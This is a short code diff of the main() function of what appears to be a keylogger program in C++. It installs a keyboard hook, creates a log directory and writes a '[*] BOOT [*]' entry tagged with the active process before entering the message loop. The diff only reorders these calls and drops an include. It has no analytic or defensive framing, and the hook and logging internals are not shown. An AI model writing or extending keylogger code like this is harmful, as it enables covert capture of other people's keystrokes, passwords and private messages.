@@ -1,13 +1,12 @@
 #include "stream.h"
 #include "keyhook.h"
-#include "helper.h"
 
 int main() {
   stream::MakeDir(stream::GetPath());
   key_hook::InstallHook();
 
-  key_hook::HandleMessage(true);
+  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);
 
-  stream::WriteLog("[*] BOOT [*]", 0x0);
+  key_hook::HandleMessage(true);
   return 0;
 }
